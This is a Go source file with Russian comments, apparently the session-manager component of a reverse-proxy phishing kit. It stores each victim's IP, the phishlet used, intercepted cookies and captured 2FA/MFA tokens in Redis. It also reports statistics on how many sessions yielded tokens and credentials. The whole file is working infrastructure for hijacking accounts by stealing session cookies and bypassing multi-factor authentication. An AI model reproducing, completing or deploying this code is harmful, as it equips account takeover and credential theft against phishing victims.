// Package proxy - Session Manager
package proxy

import (
	"context"
	"encoding/json"
	"fmt"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/redis/go-redis/v9"
	"go.uber.org/zap"
)

// Session представляет сессию жертвы
type Session struct {
	ID         string            `json:"id"`
	VictimIP   string            `json:"victim_ip"`
	TargetHost string            `json:"target_host"`
	PhishletID string            `json:"phishlet_id"`
	UserAgent  string            `json:"user_agent"`
	Cookies    map[string]string `json:"cookies"`
	Tokens     map[string]string `json:"tokens"`
	CreatedAt  time.Time         `json:"created_at"`
	LastActive time.Time         `json:"last_active"`
}

// SessionManager управляет сессиями
type SessionManager struct {
	mu     sync.RWMutex
	redis  *redis.Client
	logger *zap.Logger
	ttl    time.Duration
}

// NewSessionManager создает менеджер сессий
func NewSessionManager(rdb *redis.Client, logger *zap.Logger, ttl time.Duration) *SessionManager {
	return &SessionManager{
		redis:  rdb,
		logger: logger,
		ttl:    ttl,
	}
}

// Create создает новую сессию
func (m *SessionManager) Create(ctx context.Context, victimIP, targetHost string) (string, error) {
	m.mu.Lock()
	defer m.mu.Unlock()

	session := &Session{
		ID:         uuid.New().String(),
		VictimIP:   victimIP,
		TargetHost: targetHost,
		Cookies:    make(map[string]string),
		Tokens:     make(map[string]string),
		CreatedAt:  time.Now(),
		LastActive: time.Now(),
	}

	data, err := json.Marshal(session)
	if err != nil {
		return "", err
	}

	key := fmt.Sprintf("session:%s", session.ID)
	if err := m.redis.Set(ctx, key, data, m.ttl).Err(); err != nil {
		return "", err
	}

	m.logger.Info("Session created",
		zap.String("id", session.ID),
		zap.String("victim_ip", victimIP),
		zap.String("target_host", targetHost),
	)

	return session.ID, nil
}

// Get получает сессию по ID
func (m *SessionManager) Get(ctx context.Context, id string) (*Session, error) {
	key := fmt.Sprintf("session:%s", id)
	data, err := m.redis.Get(ctx, key).Bytes()
	if err != nil {
		if err == redis.Nil {
			return nil, fmt.Errorf("session not found: %s", id)
		}
		return nil, err
	}

	var session Session
	if err := json.Unmarshal(data, &session); err != nil {
		return nil, err
	}

	// Обновить last_active
	session.LastActive = time.Now()
	if err := m.Update(ctx, &session); err != nil {
		m.logger.Warn("Failed to update session last_active", zap.Error(err))
	}

	return &session, nil
}

// Update обновляет сессию
func (m *SessionManager) Update(ctx context.Context, session *Session) error {
	data, err := json.Marshal(session)
	if err != nil {
		return err
	}

	key := fmt.Sprintf("session:%s", session.ID)
	return m.redis.Set(ctx, key, data, m.ttl).Err()
}

// Delete удаляет сессию
func (m *SessionManager) Delete(ctx context.Context, id string) error {
	key := fmt.Sprintf("session:%s", id)
	return m.redis.Del(ctx, key).Err()
}

// AddCookie добавляет cookie в сессию
func (m *SessionManager) AddCookie(ctx context.Context, sessionID, name, value string) error {
	session, err := m.Get(ctx, sessionID)
	if err != nil {
		return err
	}

	session.Cookies[name] = value
	return m.Update(ctx, session)
}

// CaptureToken перехватывает токен (2FA/MFA)
func (m *SessionManager) CaptureToken(ctx context.Context, sessionID, tokenName, tokenValue string) error {
	session, err := m.Get(ctx, sessionID)
	if err != nil {
		return err
	}

	session.Tokens[tokenName] = tokenValue
	m.logger.Info("Token captured",
		zap.String("session", sessionID),
		zap.String("token", tokenName),
	)

	return m.Update(ctx, session)
}

// ListSessions возвращает список сессий
func (m *SessionManager) ListSessions(ctx context.Context, limit int64) ([]*Session, error) {
	pattern := "session:*"
	cursor := uint64(0)
	var sessions []*Session

	for {
		keys, nextCursor, err := m.redis.Scan(ctx, cursor, pattern, limit).Result()
		if err != nil {
			return nil, err
		}

		for _, key := range keys {
			data, err := m.redis.Get(ctx, key).Bytes()
			if err != nil {
				continue
			}

			var session Session
			if err := json.Unmarshal(data, &session); err != nil {
				continue
			}

			sessions = append(sessions, &session)
		}

		if nextCursor == 0 {
			break
		}
		cursor = nextCursor
	}

	return sessions, nil
}

// GetStats возвращает статистику сессий
func (m *SessionManager) GetStats(ctx context.Context) (map[string]interface{}, error) {
	sessions, err := m.ListSessions(ctx, 1000)
	if err != nil {
		return nil, err
	}

	active := 0
	withTokens := 0
	withCredentials := 0

	for _, s := range sessions {
		if time.Since(s.LastActive) < 5*time.Minute {
			active++
		}
		if len(s.Tokens) > 0 {
			withTokens++
		}
		if len(s.Cookies) > 0 {
			withCredentials++
		}
	}

	return map[string]interface{}{
		"total_sessions":     len(sessions),
		"active_sessions":    active,
		"sessions_with_tokens": withTokens,
		"sessions_with_credentials": withCredentials,
	}, nil
}
